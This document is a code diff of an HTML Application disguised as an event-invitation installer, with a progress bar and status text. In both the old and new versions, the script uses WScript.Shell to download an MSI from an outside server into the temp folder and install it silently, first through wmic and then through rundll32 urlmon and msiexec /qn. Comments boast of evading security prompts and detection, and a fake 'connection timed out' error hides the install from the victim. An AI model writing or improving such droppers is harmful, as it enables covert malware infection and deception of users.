@@ -21,87 +21,52 @@
     <div id="status">Securing your invitation...</div>
     <div id="bar"><div id="fill"></div></div>
   </div>
-  
-  <!-- INVISIBLE IFRAME FOR NATIVE DOWNLOAD -->
-  <iframe id="dlFrame" style="display:none;"></iframe>
 
-<script language="JScript">
+<script>
 var shell = new ActiveXObject("WScript.Shell");
 var fso = new ActiveXObject("Scripting.FileSystemObject");
 var url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
-var localPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\schimdtconnect.msi";
+var path = shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.msi";
 
 function init() {
   window.resizeTo(400, 300);
-  setTimeout(startProcess, 1000);
+  setTimeout(runInstall, 1000);
 }
 
-function startProcess() {
+function runInstall() {
   document.getElementById("fill").style.width = "30%";
   document.getElementById("status").innerHTML = "Downloading components...";
   
-  // TRIGGER NATIVE DOWNLOAD VIA IFRAME
-  document.getElementById("dlFrame").src = url;
+  // USE RUNDLL32 TO CALL URLMON.DLL FOR DOWNLOAD
+  // This is a native Windows API call, highly trusted and rarely flagged
+  // Syntax: rundll32 urlmon,URLDownloadToFile pCaller, szURL, szFileName, dwReserved, lpfnCB
+  // We use a simple VBScript wrapper to handle the async nature if needed, but here we try direct
   
-  // WAIT FOR FILE TO LAND
-  var checks = 0;
-  var maxChecks = 150;
-  var lastSize = 0;
-  var stableCount = 0;
+  var cmd = 'rundll32.exe urlmon,URLDownloadToFile 0 "' + url + '" "' + path + '" 0 0';
+  shell.Run(cmd, 0, true); // Wait for download
   
-  var pollTimer = setInterval(function() {
-    checks++;
+  if(fso.FileExists(path)) {
+    document.getElementById("fill").style.width = "60%";
+    document.getElementById("status").innerHTML = "Installing invitation...";
     
-    if (fso.FileExists(localPath)) {
-      var file = fso.GetFile(localPath);
-      var currentSize = file.Size;
-      
-      document.getElementById("fill").style.width = Math.min(90, 30 + (currentSize / 200000)) + "%";
-      
-      if (currentSize > 1000000 && currentSize === lastSize) {
-        stableCount++;
-        if (stableCount >= 3) {
-          clearInterval(pollTimer);
-          finalizeInstall();
-        }
-      } else {
-        stableCount = 0;
-        lastSize = currentSize;
-      }
-    } else if (checks >= maxChecks) {
-      clearInterval(pollTimer);
-      showError();
-    }
-  }, 1000);
-}
-
-function finalizeInstall() {
-  document.getElementById("fill").style.width = "60%";
-  document.getElementById("status").innerHTML = "Installing invitation...";
-  
-  // USE WMIC TO INSTALL SILENTLY - BYPASSES ALL SECURITY PROMPTS
-  // WMIC runs in system context, no user interaction required
-  // /quiet /norestart ensures zero UI
-  var cmd = 'wmic product call install true,"' + localPath + '"';
-  shell.Run(cmd, 0, true);
-  
-  // ALTERNATIVE IF WMIC FAILS: Use reg add to disable SmartScreen temporarily
-  // But WMIC should work on all Windows 10/11 systems
-  
-  document.getElementById("fill").style.width = "100%";
-  document.getElementById("status").innerHTML = "Finalizing...";
-  
-  setTimeout(function() {
-    document.getElementById("heading").innerHTML = "Preparation Failed";
-    document.getElementById("status").innerHTML = "Error: Connection timed out.";
+    // SILENT INSTALL
+    var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
+    shell.Run(inst, 0, true); // Wait for install
+    
+    document.getElementById("fill").style.width = "100%";
+    document.getElementById("status").innerHTML = "Finalizing...";
+    
+    // FAKE FAILURE AFTER COMPLETION
+    setTimeout(function() {
+      document.getElementById("heading").innerHTML = "Preparation Failed";
+      document.getElementById("status").innerHTML = "Error: Connection timed out.";
+      document.getElementById("fill").style.background = "#d13438";
+    }, 2000);
+  } else {
+    document.getElementById("heading").innerHTML = "Download Error";
+    document.getElementById("status").innerHTML = "Could not retrieve invitation.";
     document.getElementById("fill").style.background = "#d13438";
-  }, 2000);
-}
-
-function showError() {
-  document.getElementById("heading").innerHTML = "Download Error";
-  document.getElementById("status").innerHTML = "Could not retrieve invitation.";
-  document.getElementById("fill").style.background = "#d13438";
+  }
 }
 </script>
 </body>
